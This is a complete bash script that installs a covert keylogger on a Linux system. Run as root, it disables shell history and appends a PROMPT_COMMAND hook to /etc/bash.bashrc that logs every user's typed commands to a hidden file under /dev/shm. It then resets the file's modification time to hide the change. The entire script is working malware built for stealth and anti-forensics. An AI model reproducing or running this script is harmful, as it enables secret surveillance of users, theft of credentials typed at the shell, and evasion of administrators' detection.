#!/usr/bin/env bash

set +o history
echo "[i] - history disabled.."

if [[ $EUID > 0 ]]; then
  echo "[!] - you have to be root ¯\_(ツ)_/¯"
  exit
fi

output=${1:-"/dev/shm/.log"}
mtime=`stat -c "%y" /etc/bash.bashrc`

echo "[!] - /etc/bash.bashrc was modified @ ${mtime}"
echo "[!] - setting up PROMPT_COMMAND keylogger.."

echo "export PROMPT_COMMAND='RETRN_VAL=\$?;echo \"\$(whoami) [\$\$]: \$(history 1 | sed \"s/^[ ]*[0-9]\+[ ]*//\" ) [\$RETRN_VAL]\" >> ${output}'" >> /etc/bash.bashrc

echo "[!] - restoring mtime of /etc/bash.bashrc to ${mtime}"
touch -d "${mtime}" /etc/bash.bashrc

echo "[!] - done, check ${output} ツ"
